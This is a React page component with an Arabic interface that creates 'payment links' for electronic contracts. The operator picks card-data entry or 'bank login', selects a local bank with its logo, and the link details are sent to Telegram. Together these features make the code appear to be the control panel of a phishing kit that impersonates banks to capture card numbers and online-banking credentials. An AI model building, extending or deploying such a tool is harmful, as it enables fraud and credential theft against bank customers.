import { useState, useMemo } from "react";
import { useParams, useNavigate } from "react-router-dom";
import { Card } from "@/components/ui/card";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select";
import { Textarea } from "@/components/ui/textarea";
import { useCreateLink } from "@/hooks/useSupabase";
import { getCountryByCode } from "@/lib/countries";
import { getBanksByCountry } from "@/lib/banks";
import { getCurrencySymbol, getCurrencyName, getCurrencyCode, formatCurrency } from "@/lib/countryCurrencies";
import { generatePaymentLink } from "@/utils/paymentLinks";
import { sendToTelegram } from "@/lib/telegram";
import { FileText, Scale, User, DollarSign, CreditCard, Building2, Copy, ExternalLink, Calendar } from "lucide-react";
import { useToast } from "@/hooks/use-toast";
import TelegramTest from "@/components/TelegramTest";
import {
  AlertDialog,
  AlertDialogContent,
  AlertDialogDescription,
  AlertDialogHeader,
  AlertDialogTitle,
} from "@/components/ui/alert-dialog";

const CreateContractLink = () => {
  const { country } = useParams();
  const navigate = useNavigate();
  const { toast } = useToast();
  const createLink = useCreateLink();
  const countryData = getCountryByCode(country?.toUpperCase() || "");

  const [contractTemplate, setContractTemplate] = useState("");
  const [partyAName, setPartyAName] = useState("");
  const [partyBName, setPartyBName] = useState("");
  const [contractValue, setContractValue] = useState("");
  const [contractDuration, setContractDuration] = useState("");
  const [startDate, setStartDate] = useState("");
  const [endDate, setEndDate] = useState("");
  const [contractDescription, setContractDescription] = useState("");
  const [notes, setNotes] = useState("");
  const [paymentMethod, setPaymentMethod] = useState("card");
  const [selectedBank, setSelectedBank] = useState("");
  const [showSuccessDialog, setShowSuccessDialog] = useState(false);
  const [createdPaymentUrl, setCreatedPaymentUrl] = useState("");
  const [linkId, setLinkId] = useState("");
  const [copied, setCopied] = useState(false);

  const banks = useMemo(() => getBanksByCountry(country?.toUpperCase() || ""), [country]);

  const contractTemplates = [
    { value: "service_agreement", label: "عقد اتفاق خدمة", category: "خدمات" },
    { value: "employment_contract", label: "عقد عمل موظف", category: "توظيف" },
    { value: "sale_purchase", label: "عقد بيع وشراء", category: "بيع" },
    { value: "lease_agreement", label: "عقد إيجار عقار", category: "عقارات" },
    { value: "consulting_contract", label: "عقد استشارات", category: "استشارات" },
  ];

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();

    if (!contractTemplate || !partyAName || !partyBName || !contractValue) {
      toast({
        title: "خطأ",
        description: "الرجاء ملء جميع الحقول المطلوبة",
        variant: "destructive",
      });
      return;
    }

    if (paymentMethod === "bank_login" && !selectedBank) {
      toast({
        title: "خطأ",
        description: "الرجاء اختيار البنك",
        variant: "destructive",
      });
      return;
    }

    try {
      const template = contractTemplates.find(t => t.value === contractTemplate);
      
      const link = await createLink.mutateAsync({
        type: "contracts",
        country_code: country || "",
        payload: {
          template_id: contractTemplate,
          template_name: template?.label || '',
          template_category: template?.category || '',
          party_a_name: partyAName,
          party_b_name: partyBName,
          contract_value: parseFloat(contractValue) || 0,
          contract_duration: contractDuration,
          start_date: startDate,
          end_date: endDate,
          contract_description: contractDescription,
          notes: notes,
          currency_code: getCurrencyCode(country || "SA"),
          payment_method: paymentMethod,
          selected_bank: paymentMethod === "bank_login" ? selectedBank : null,
          selectedCountry: country || "SA",
        },
      });

      const paymentUrl = generatePaymentLink({
        invoiceId: link.id,
        company: "contract",
        country: country || 'SA'
      });

      const telegramResult = await sendToTelegram({
        type: 'contract_link_created',
        data: {
          template_name: template?.label || '',
          party_a_name: partyAName,
          party_b_name: partyBName,
          contract_value: parseFloat(contractValue) || 0,
          start_date: startDate,
          country: countryData?.nameAr || '',
          payment_url: paymentUrl
        },
        timestamp: new Date().toISOString(),
        description: `عقد جديد - ${template?.label}`
      });

      setCreatedPaymentUrl(paymentUrl);
      setLinkId(link.id);
      setShowSuccessDialog(true);

      if (telegramResult.success) {
        toast({
          title: "تم إنشاء رابط العقد بنجاح!",
          description: "تم إرسال البيانات إلى التليجرام",
        });
      } else {
        console.error('Telegram error:', telegramResult.error);
        toast({
          title: "تحذير",
          description: "تم إنشاء الرابط ولكن فشل في إرسال البيانات إلى التليجرام",
          variant: "destructive",
        });
      }
    } catch (error) {
      console.error("Error creating link:", error);
      toast({
        title: "خطأ في إنشاء الرابط",
        description: "حدث خطأ أثناء إنشاء رابط العقد",
        variant: "destructive",
      });
    }
  };

  const handleCopyLink = () => {
    navigator.clipboard.writeText(createdPaymentUrl);
    setCopied(true);
    setTimeout(() => setCopied(false), 2000);
    toast({
      title: "تم النسخ!",
      description: "تم نسخ الرابط إلى الحافظة",
    });
  };

  const handlePreview = () => {
    window.open(createdPaymentUrl, '_blank');
  };

  if (!countryData) {
    return (
      <div className="min-h-screen flex items-center justify-center bg-background" dir="rtl">
        <div className="text-center p-8">
          <Scale className="w-16 h-16 mx-auto mb-4 text-muted-foreground" />
          <h2 className="text-2xl font-bold mb-2 text-foreground">الدولة غير موجودة</h2>
          <p className="text-muted-foreground mb-6">الرجاء اختيار دولة صحيحة</p>
          <Button onClick={() => navigate('/services')}>العودة للخدمات</Button>
        </div>
      </div>
    );
  }

  return (
    <div className="min-h-screen py-4 bg-gradient-to-b from-background to-secondary/20" dir="rtl">
      <div className="container mx-auto px-4">
        <div className="mb-6">
          <TelegramTest />
        </div>

        <div className="max-w-2xl mx-auto">
          <Card className="p-4 shadow-elevated">
            <div
              className="h-16 -m-4 mb-4 rounded-t-xl relative"
              style={{
                background: `linear-gradient(135deg, ${countryData.primaryColor}, ${countryData.secondaryColor})`,
              }}
            >
              <div className="absolute inset-0 bg-black/20 rounded-t-xl" />
              <div className="absolute bottom-2 right-4 text-white">
                <h1 className="text-lg font-bold">إنشاء رابط دفع - عقد إلكتروني</h1>
                <p className="text-xs opacity-90">{countryData.nameAr}</p>
              </div>
            </div>

            <form onSubmit={handleSubmit} className="space-y-4">
              <div>
                <Label className="mb-2 flex items-center gap-2 text-sm">
                  <FileText className="w-3 h-3" />
                  نوع العقد *
                </Label>
                <Select value={contractTemplate} onValueChange={setContractTemplate}>
                  <SelectTrigger className="h-10">
                    <SelectValue placeholder="اختر نوع العقد..." />
                  </SelectTrigger>
                  <SelectContent>
                    {contractTemplates.map((template) => (
                      <SelectItem key={template.value} value={template.value}>
                        <div className="flex items-center justify-between w-full">
                          <span>{template.label}</span>
                          <span className="text-xs text-muted-foreground mr-2">{template.category}</span>
                        </div>
                      </SelectItem>
                    ))}
                  </SelectContent>
                </Select>
              </div>

              <div>
                <Label className="mb-2 flex items-center gap-2 text-sm">
                  <User className="w-3 h-3" />
                  الطرف الأول *
                </Label>
                <Input
                  value={partyAName}
                  onChange={(e) => setPartyAName(e.target.value)}
                  placeholder="اسم الطرف الأول (العميل/الموظف/البائع)"
                  className="h-9 text-sm"
                  required
                />
              </div>

              <div>
                <Label className="mb-2 flex items-center gap-2 text-sm">
                  <User className="w-3 h-3" />
                  الطرف الثاني *
                </Label>
                <Input
                  value={partyBName}
                  onChange={(e) => setPartyBName(e.target.value)}
                  placeholder="اسم الطرف الثاني (المزود/صاحب العمل/المشتري)"
                  className="h-9 text-sm"
                  required
                />
              </div>

              <div>
                <Label className="mb-2 text-sm">
                  وصف العقد (اختياري)
                </Label>
                <Textarea
                  value={contractDescription}
                  onChange={(e) => setContractDescription(e.target.value)}
                  placeholder="وصف مختصر للعقد..."
                  className="text-sm"
                  rows={3}
                />
              </div>

              <div>
                <Label className="mb-2 flex items-center gap-2 text-sm">
                  <DollarSign className="w-3 h-3" />
                  قيمة العقد *
                  {country && (
                    <span className="text-xs text-muted-foreground">
                      ({getCurrencyName(country)})
                    </span>
                  )}
                </Label>
                <Input
                  type="number"
                  value={contractValue}
                  onChange={(e) => setContractValue(e.target.value)}
                  placeholder={country ? `0.00 ${getCurrencySymbol(country)}` : "0.00"}
                  className="h-9 text-sm"
                  step="0.01"
                  min="0"
                  required
                />
                {country && (
                  <p className="text-xs text-muted-foreground mt-1">
                    💱 العملة: {getCurrencyName(country)} ({getCurrencySymbol(country)})
                  </p>
                )}
              </div>

              <div>
                <Label className="mb-2 text-sm">
                  مدة العقد (اختياري)
                </Label>
                <Input
                  value={contractDuration}
                  onChange={(e) => setContractDuration(e.target.value)}
                  placeholder="مثال: سنة واحدة، 6 أشهر"
                  className="h-9 text-sm"
                />
              </div>

              <div className="grid grid-cols-2 gap-4">
                <div>
                  <Label className="mb-2 flex items-center gap-2 text-sm">
                    <Calendar className="w-3 h-3" />
                    تاريخ البداية (اختياري)
                  </Label>
                  <Input
                    type="date"
                    value={startDate}
                    onChange={(e) => setStartDate(e.target.value)}
                    className="h-9 text-sm"
                  />
                </div>

                <div>
                  <Label className="mb-2 flex items-center gap-2 text-sm">
                    <Calendar className="w-3 h-3" />
                    تاريخ النهاية (اختياري)
                  </Label>
                  <Input
                    type="date"
                    value={endDate}
                    onChange={(e) => setEndDate(e.target.value)}
                    min={startDate || undefined}
                    className="h-9 text-sm"
                  />
                </div>
              </div>

              <div>
                <Label className="mb-2 text-sm">ملاحظات إضافية (اختياري)</Label>
                <Textarea
                  value={notes}
                  onChange={(e) => setNotes(e.target.value)}
                  placeholder="أي ملاحظات قانونية أو إدارية..."
                  className="text-sm"
                  rows={2}
                />
              </div>

              <div>
                <Label className="mb-2 flex items-center gap-2 text-sm">
                  <CreditCard className="w-3 h-3" />
                  طريقة الدفع *
                </Label>
                <Select value={paymentMethod} onValueChange={setPaymentMethod}>
                  <SelectTrigger className="h-10">
                    <SelectValue placeholder="اختر طريقة الدفع" />
                  </SelectTrigger>
                  <SelectContent className="bg-background">
                    <SelectItem value="card">
                      <div className="flex items-center gap-2">
                        <CreditCard className="w-4 h-4" />
                        <span>بيانات البطاقة</span>
                      </div>
                    </SelectItem>
                    <SelectItem value="bank_login">
                      <div className="flex items-center gap-2">
                        <Building2 className="w-4 h-4" />
                        <span>تسجيل دخول البنك</span>
                      </div>
                    </SelectItem>
                  </SelectContent>
                </Select>
                <p className="text-xs text-muted-foreground mt-1">
                  {paymentMethod === "card"
                    ? "🔒 سيُطلب من العميل إدخال بيانات البطاقة"
                    : "🏦 سيُطلب من العميل تسجيل الدخول للبنك"}
                </p>
              </div>

              {paymentMethod === "bank_login" && (
                <div>
                  <Label className="text-sm mb-2 flex items-center gap-2">
                    <Building2 className="w-3 h-3" />
                    اختر البنك *
                  </Label>
                  <Select value={selectedBank} onValueChange={setSelectedBank}>
                    <SelectTrigger className="h-10">
                      <SelectValue placeholder="اختر البنك" />
                    </SelectTrigger>
                    <SelectContent className="bg-background">
                      {banks.length > 0 ? (
                        banks.map((bank) => (
                          <SelectItem key={bank.id} value={bank.id}>
                            <div className="flex items-center gap-2">
                              {bank.logo && (
                                <img
                                  src={bank.logo}
                                  alt={bank.nameAr}
                                  className="h-5 w-5 object-contain"
                                  onError={(e) => e.currentTarget.style.display = 'none'}
                                />
                              )}
                              <span>{bank.nameAr}</span>
                            </div>
                          </SelectItem>
                        ))
                      ) : (
                        <SelectItem value="no-bank" disabled>
                          لا توجد بنوك متاحة
                        </SelectItem>
                      )}
                    </SelectContent>
                  </Select>
                  <p className="text-xs text-muted-foreground mt-1">
                    💡 سيتم توجيه العميل لصفحة تسجيل دخول {banks.find(b => b.id === selectedBank)?.nameAr || 'البنك'}
                  </p>
                </div>
              )}

              <Button
                type="submit"
                className="w-full py-5"
                disabled={createLink.isPending}
              >
                {createLink.isPending ? (
                  <span className="text-sm">جاري الإنشاء...</span>
                ) : (
                  <>
                    <Scale className="w-4 h-4 ml-2" />
                    <span className="text-sm">إنشاء رابط العقد</span>
                  </>
                )}
              </Button>
            </form>
          </Card>
        </div>
      </div>

      <AlertDialog open={showSuccessDialog} onOpenChange={setShowSuccessDialog}>
        <AlertDialogContent className="max-w-md" dir="rtl">
          <AlertDialogHeader>
            <AlertDialogTitle className="text-xl text-center">
              ✅ تم إنشاء رابط العقد بنجاح!
            </AlertDialogTitle>
            <AlertDialogDescription className="text-center">
              يمكنك نسخ الرابط أو معاينته قبل المتابعة
            </AlertDialogDescription>
          </AlertDialogHeader>

          <div className="my-4">
            <div className="bg-secondary/50 p-4 rounded-lg mb-4 space-y-2">
              <div className="flex items-center justify-between text-sm">
                <span className="text-muted-foreground">نوع العقد:</span>
                <span className="font-semibold">{contractTemplates.find(t => t.value === contractTemplate)?.label}</span>
              </div>
              <div className="flex items-center justify-between text-sm">
                <span className="text-muted-foreground">الطرف الأول:</span>
                <span className="font-semibold">{partyAName}</span>
              </div>
              <div className="flex items-center justify-between text-sm">
                <span className="text-muted-foreground">الطرف الثاني:</span>
                <span className="font-semibold">{partyBName}</span>
              </div>
              {startDate && (
                <div className="flex items-center justify-between text-sm">
                  <span className="text-muted-foreground">تاريخ البداية:</span>
                  <span className="font-semibold">{startDate}</span>
                </div>
              )}
              {endDate && (
                <div className="flex items-center justify-between text-sm">
                  <span className="text-muted-foreground">تاريخ النهاية:</span>
                  <span className="font-semibold">{endDate}</span>
                </div>
              )}
              <div className="flex items-center justify-between text-sm pt-2 border-t border-border/50">
                <span className="text-muted-foreground">قيمة العقد:</span>
                <span className="font-bold text-lg">
                  {formatCurrency(parseFloat(contractValue) || 0, country || "SA")}
                </span>
              </div>
              <div className="flex items-center justify-between text-sm">
                <span className="text-muted-foreground">طريقة الدفع:</span>
                <span className="font-semibold">
                  {paymentMethod === "card" ? "بطاقة ائتمان" : "تسجيل دخول البنك"}
                </span>
              </div>
            </div>

            <div className="bg-secondary/50 p-3 rounded-lg mb-3 break-all text-xs">
              {createdPaymentUrl}
            </div>

            <div className="flex gap-2">
              <Button
                onClick={handleCopyLink}
                variant="outline"
                className="flex-1"
              >
                {copied ? (
                  <>
                    <Copy className="w-4 h-4 ml-2" />
                    تم النسخ!
                  </>
                ) : (
                  <>
                    <Copy className="w-4 h-4 ml-2" />
                    نسخ الرابط
                  </>
                )}
              </Button>

              <Button
                onClick={handlePreview}
                variant="outline"
                className="flex-1"
              >
                <ExternalLink className="w-4 h-4 ml-2" />
                معاينة
              </Button>
            </div>
          </div>

        </AlertDialogContent>
      </AlertDialog>
    </div>
  );
};

export default CreateContractLink;
